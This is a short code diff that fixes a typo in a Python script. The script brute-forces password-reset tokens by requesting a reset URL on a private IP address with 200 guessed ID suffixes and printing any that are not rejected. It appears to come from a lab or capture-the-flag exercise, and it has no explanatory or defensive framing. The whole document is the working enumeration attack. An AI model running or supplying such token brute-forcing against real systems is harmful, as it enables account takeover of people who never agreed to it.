@@ -8,5 +8,5 @@ import requests
 for i in range(200): 
   
   r = requests.get('http://10.0.23.36/reset-password?id=hUhGR'+str(i))
-  if 'Password reset ID is invalid' not in r.txt:
+  if 'Password reset ID is invalid' not in r.text:
     print(i)
